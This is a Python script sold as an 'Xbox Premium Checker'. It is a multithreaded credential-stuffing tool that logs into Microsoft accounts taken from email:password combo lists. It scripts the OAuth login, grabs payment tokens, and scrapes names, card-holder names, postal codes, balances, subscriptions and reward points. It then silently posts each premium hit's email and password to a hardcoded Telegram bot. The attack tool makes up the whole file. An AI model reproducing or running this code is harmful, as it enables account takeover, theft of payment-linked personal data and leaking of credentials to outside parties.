import requests
import json
import uuid
import re
import time
import os
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock, Thread
import concurrent.futures
from urllib.parse import quote, unquote

# Telegram configuration
TELEGRAM_BOT_TOKEN = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
TELEGRAM_CHAT_ID = "8260250818"

class TelegramSender:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    
    def send_message(self, text):
        """Send message asynchronously to Telegram"""
        def _send():
            try:
                url = f"{self.base_url}/sendMessage"
                payload = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": text,
                    "parse_mode": "HTML"
                }
                requests.post(url, data=payload, timeout=10)
            except Exception:
                pass
        
        Thread(target=_send, daemon=True).start()
    
    def format_hit_message(self, email, password, data):
        """Format hit message with aesthetic style"""
        premium_type = data.get('premium_type', 'PREMIUM')
        country = data.get('country', 'N/A')
        days = data.get('days_remaining', '0')
        auto_renew = data.get('auto_renew', 'NO')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        name = data.get('name', '')
        card_holder = data.get('card_holder', '')
        rewards_points = data.get('rewards_points', '')
        
        # Format renewal date
        if renewal_date != 'N/A':
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        # Build message with proper Unicode escaping
        message = "\U0001f9ce\u033b\U0001f9ce\u033b  \U0001f3ae\U0001f380\n"
        message += f"\U0001f337 <code>{email}</code> \U0001f337 \U0001f510 <code>{password}</code>\n"
        message += f"\U0001f338 <b>{premium_type}</b> ({country}) \u23f3 {days} days \U0001f501 <b>Renews {renewal_formatted}</b> \U0001f4b8 ${total_amount} {currency}\n"
        
        if name:
            message += f"\U0001f349 <i>{name}</i> \u2727 \u2661\n"
        if card_holder:
            message += f"\U0001f4b3 {card_holder}\n"
        if rewards_points:
            message += f"\u2b50 {rewards_points} points\n"
            
        message += "\U0001f9ce\u033b \u2727\u2661\n"
        message += "\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
        
        return message

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, message):
        if self.debug:
            print("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            self.log("Checking: " + email)
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log("IDP Response: " + str(r1.status_code))
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("IDP check failed")
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                self.log("MSAccount not found")
                return {"status": "BAD", "data": {}}
            self.log("IDP check success")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                self.log("PPFT or URL not found")
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            self.log("PPFT found: " + ppft[:30] + "...")
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log("Login Response: " + str(r3.status_code))
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("Bad credentials")
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                self.log("2FA required")
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                self.log("Account banned")
                return {"status": "BANNED", "data": {}}
            location = r3.headers.get("Location", "")
            if not location:
                self.log("Redirect location not found")
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("Auth code not found")
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            self.log("Auth code obtained: " + code[:30] + "...")
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("CID not found")
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            self.log("CID: " + cid)
            
            # Step 4: Get access token
            self.log("Step 4: Getting token...")
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                self.log("Access token not obtained")
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log("Token obtained")
            
            # Step 5: Get profile info
            self.log("Step 5: Getting profile info...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            country = ""
            name = ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
                    self.log("Profile: Name=" + name + " | Country=" + country)
            except Exception as e:
                self.log("Profile error: " + str(e))
            
            # Step 6: Get Xbox payment token
            self.log("Step 6: Getting Xbox payment token...")
            time.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "data": {"country": country, "name": name}}
            self.log("Payment token obtained")
            
            # Step 7: Check payment instruments
            self.log("Step 7: Checking payment instruments...")
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            correlation_id2 = str(uuid.uuid4())
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            self.log("Step 9: Checking subscription...")
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    has_premium = False
                    premium_type = "FREE"
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)
                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            self.log("Subscription expired")
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        self.log("Premium found: " + premium_type)
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        self.log("No subscription - FREE")
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}
            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
        except requests.exceptions.Timeout:
            self.log("Timeout")
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            self.log("Exception: " + str(e))
            return {"status": "ERROR", "data": {}}

class ResultManager:
    def __init__(self, combo_filename):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = "/storage/emulated/0/xbox_results/" + timestamp + "_" + combo_filename
        self.premium_folder = os.path.join(self.base_folder, "premium")
        self.free_folder = os.path.join(self.base_folder, "free")
        self.bad_folder = os.path.join(self.base_folder, "bad")
        Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
        Path(self.free_folder).mkdir(parents=True, exist_ok=True)
        Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
        self.premium_file = os.path.join(self.premium_folder, "premium_accounts.txt")
        self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
        self.bad_file = os.path.join(self.bad_folder, "bad_accounts.txt")
        self.telegram = TelegramSender()
    
    def save_result(self, email, password, result):
        status = result['status']
        data = result.get('data', {})
        line = email + ":" + password
        
        # Send Telegram notification for premium hits
        if status == "PREMIUM":
            try:
                formatted_msg = self.telegram.format_hit_message(email, password, data)
                self.telegram.send_message(formatted_msg)
            except Exception:
                pass  # Silent fail for Telegram issues
        
        # Original file saving logic
        if status == "PREMIUM":
            premium_type = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            days_remaining = data.get('days_remaining', '0')
            auto_renew = data.get('auto_renew', 'NO')
            renewal_date = data.get('renewal_date', 'N/A')
            capture = []
            capture.append("Type: " + premium_type)
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            capture.append("Days: " + days_remaining)
            capture.append("AutoRenew: " + auto_renew)
            capture.append("Renewal: " + renewal_date)
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            if 'balance' in data:
                capture.append("Balance: " + data['balance'])
            if 'rewards_points' in data:
                capture.append("Points: " + data['rewards_points'])
            full_line = line + " | " + " | ".join(capture) + "\n"
            with open(self.premium_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
        elif status == "FREE":
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            capture = []
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            if 'rewards_points' in data:
                capture.append("Points: " + data['rewards_points'])
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            full_line = line + " | " + " | ".join(capture) + "\n"
            with open(self.free_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
        else:
            full_line = line + " | Status: " + status + "\n"
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(full_line)

class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.premium = 0
        self.free = 0
        self.bad = 0
        self.start_time = time.time()
        self.lock = Lock()
    
    def update(self, status):
        with self.lock:
            self.checked += 1
            if status == "PREMIUM":
                self.premium += 1
            elif status == "FREE":
                self.free += 1
            else:
                self.bad += 1
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            return {
                "total": self.total,
                "checked": self.checked,
                "premium": self.premium,
                "free": self.free,
                "bad": self.bad,
                "progress": progress,
                "cpm": cpm,
                "elapsed": elapsed
            }
    
    def print_stats(self, colors):
        stats = self.get_stats()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(stats['elapsed']))
        line = "\r" + colors.CYAN + "┃ " + str(stats['checked']) + "/" + str(stats['total']) + " ┃" + colors.END + " "
        line += colors.GREEN + "✓ " + str(stats['premium']) + colors.END + " │ "
        line += colors.YELLOW + "○ " + str(stats['free']) + colors.END + " │ "
        line += colors.RED + "✗ " + str(stats['bad']) + colors.END + " │ "
        line += colors.MAGENTA + "█" * int(stats['progress'] / 5) + colors.DARK + "░" * (20 - int(stats['progress'] / 5)) + colors.END + " "
        line += colors.CYAN + "{:.0f}".format(stats['cpm']) + " CPM" + colors.END + " │ "
        line += colors.WHITE + elapsed_str + colors.END
        print(line, end='', flush=True)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK = '\033[90m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BG_CYAN = '\033[46m'
    BG_MAGENTA = '\033[45m'
    BG_BLACK = '\033[40m'

def print_banner():
    banner = Colors.CYAN + "\n"
    banner += "╔═══════════════════════════════════════════════════════════════════╗\n"
    banner += "║" + Colors.BOLD + Colors.MAGENTA + " XBOX PREMIUM CHECKER 2025 " + Colors.CYAN + "║\n"
    banner += "║" + Colors.GREEN + " Multi-Threaded Account Validator " + Colors.CYAN + "║\n"
    banner += "╠═══════════════════════════════════════════════════════════════════╣\n"
    banner += "║ " + Colors.YELLOW + "Developer:" + Colors.WHITE + " @N6NOX " + Colors.CYAN + "║\n"
    banner += "║ " + Colors.YELLOW + "Telegram:" + Colors.WHITE + " t.me/+PPz51xKsYngxNzA0 " + Colors.CYAN + "║\n"
    banner += "║ " + Colors.YELLOW + "Version:" + Colors.WHITE + " v2.0 Final | " + Colors.RED + "Premium Edition" + Colors.WHITE + " " + Colors.CYAN + "║\n"
    banner += "╚═══════════════════════════════════════════════════════════════════╝" + Colors.END
    print(banner)

def print_separator(title="", char="═"):
    if title:
        padding = (67 - len(title) - 2) // 2
        line = Colors.CYAN + char * padding + " " + Colors.BOLD + Colors.WHITE + title + Colors.END + Colors.CYAN + " " + char * padding
        if len(line) < 69:
            line += char
        print(line + Colors.END)
    else:
        print(Colors.CYAN + char * 67 + Colors.END)

def print_info_box(label, value, color=Colors.WHITE):
    print(Colors.CYAN + "┃ " + Colors.YELLOW + label.ljust(15) + Colors.CYAN + "┃ " + color + str(value) + Colors.END)

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    print()
    print_separator("SETUP")
    
    # AUTO FILE SELECTION - mergaza.txt
    auto_file_path = "/storage/emulated/0/Audiobooks/mergaza.txt"
    if os.path.exists(auto_file_path):
        file_path = auto_file_path
        print(Colors.CYAN + "┃ " + Colors.GREEN + "Auto File" + Colors.CYAN + " ➤ " + Colors.END + auto_file_path)
    else:
        print(Colors.YELLOW + "┃ ⚠ Auto file not found: " + auto_file_path + Colors.END)
        file_path = input(Colors.CYAN + "┃ " + Colors.GREEN + "Combo File" + Colors.CYAN + " ➤ " + Colors.END).strip()
    
    if not os.path.exists(file_path):
        print(Colors.RED + "\n✗ File not found!" + Colors.END)
        exit()
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        if not lines:
            print(Colors.RED + "\n✗ File is empty or invalid!" + Colors.END)
            exit()
        
        # AUTO THREADS = 50
        threads = 50
        print(Colors.CYAN + "┃ " + Colors.GREEN + "Threads" + Colors.CYAN + " ➤ " + Colors.END + str(threads) + Colors.CYAN + " [Auto-Max]" + Colors.END)
        
        # AUTO DEBUG MODE = OFF (NO PROMPT)
        debug_mode = False
        combo_filename = os.path.basename(file_path).replace('.txt', '')
        result_manager = ResultManager(combo_filename)
        
        print()
        print_separator("CONFIGURATION")
        print_info_box("Total Accounts", len(lines), Colors.WHITE)
        print_info_box("Threads", threads, Colors.CYAN)
        print_info_box("Debug Mode", "OFF", Colors.GREEN)
        print_info_box("Output Folder", result_manager.base_folder[:40] + "...", Colors.MAGENTA)
        print_info_box("Telegram Bot", "ACTIVE \u2705", Colors.GREEN)
        print_separator()
        
        print("\n" + Colors.GREEN + "\u2713 Configuration loaded successfully!" + Colors.END)
        print(Colors.CYAN + "\u27f3 Starting checker in 2 seconds..." + Colors.END)
        time.sleep(2)
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()
        print()
        print_separator("LIVE STATISTICS")
        
        live_stats = LiveStats(len(lines))
        
        def process_account(line_data):
            line, index = line_data
            try:
                if ':' not in line:
                    live_stats.update("BAD")
                    live_stats.print_stats(Colors)
                    return
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                checker = XboxChecker(debug=debug_mode)
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                live_stats.update(status)
                result_manager.save_result(email, password, result)
                live_stats.print_stats(Colors)
                time.sleep(0.8)
            except Exception as e:
                live_stats.update("BAD")
                live_stats.print_stats(Colors)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            line_data = [(line, i) for i, line in enumerate(lines, 1)]
            executor.map(process_account, line_data)
        
        final_stats = live_stats.get_stats()
        print("\n\n")
        print_separator("FINAL RESULTS")
        print(Colors.CYAN + "╔═══════════════════════════════════════════════════════════════════╗" + Colors.END)
        print(Colors.CYAN + "║" + Colors.BOLD + Colors.MAGENTA + " SCAN COMPLETE " + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "╠═══════════════════════════════════════════════════════════════════╣" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.GREEN + "\u2713 PREMIUM:" + Colors.WHITE + str(final_stats['premium']).rjust(10) + " accounts" + " " * 37 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.YELLOW + "\u25cb FREE:" + Colors.WHITE + str(final_stats['free']).rjust(13) + " accounts" + " " * 37 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.RED + "\u2717 BAD:" + Colors.WHITE + str(final_stats['bad']).rjust(14) + " accounts" + " " * 37 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "╠═══════════════════════════════════════════════════════════════════╣" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.BLUE + "TOTAL CHECKED:" + Colors.WHITE + str(final_stats['checked']).rjust(6) + "/" + str(final_stats['total']).ljust(6) + " " * 38 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.MAGENTA + "AVG SPEED:" + Colors.WHITE + "{:.0f}".format(final_stats['cpm']).rjust(10) + " CPM" + " " * 42 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.CYAN + "TIME ELAPSED:" + Colors.WHITE + time.strftime('%H:%M:%S', time.gmtime(final_stats['elapsed'])).rjust(9) + " " * 42 + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "╠═══════════════════════════════════════════════════════════════════╣" + Colors.END)
        print(Colors.CYAN + "║ " + Colors.YELLOW + "OUTPUT FOLDER:" + " " * 52 + Colors.CYAN + "║" + Colors.END)
        folder_display = result_manager.base_folder
        if len(folder_display) > 61:
            folder_display = "..." + folder_display[-58:]
        print(Colors.CYAN + "║ " + Colors.WHITE + folder_display.ljust(65) + Colors.CYAN + "║" + Colors.END)
        print(Colors.CYAN + "╚═══════════════════════════════════════════════════════════════════╝" + Colors.END)
        
        if final_stats['premium'] > 0:
            print("\n" + Colors.GREEN + Colors.BOLD + "\U0001f389 SUCCESS! Premium accounts found and saved!" + Colors.END)
            print(Colors.GREEN + "\U0001f4c1 " + result_manager.premium_file + Colors.END)
            print(Colors.GREEN + "\U0001f916 Telegram notifications sent for all premium hits!" + Colors.END)
        if final_stats['free'] > 0:
            print(Colors.YELLOW + "\U0001f4c1 " + result_manager.free_file + Colors.END)
        if final_stats['bad'] > 0:
            print(Colors.RED + "\U0001f4c1 " + result_manager.bad_file + Colors.END)
        
        print("\n" + Colors.CYAN + "╔═══════════════════════════════════════════════════════════════════╗")
        print("║" + Colors.BOLD + Colors.MAGENTA + " Thanks for using Xbox Premium Checker 2025! " + Colors.CYAN + "║")
        print("║" + Colors.YELLOW + " Developed by: @N6NOX " + Colors.CYAN + "║")
        print("║" + Colors.WHITE + " Telegram : t.me/+PPz51xKsYngxNzA0 " + Colors.CYAN + "║")
        print("╚═══════════════════════════════════════════════════════════════════╝" + Colors.END)
    
    except Exception as e:
        print("\n" + Colors.RED + "╔═══════════════════════════════════════════════════════════════════╗")
        print("║" + Colors.BOLD + " ERROR " + "║")
        print("╠═══════════════════════════════════════════════════════════════════╣")
        print("║ " + str(e)[:63].ljust(65) + "║")
        print("╚═══════════════════════════════════════════════════════════════════╝" + Colors.END)
        import traceback
        traceback.print_exc()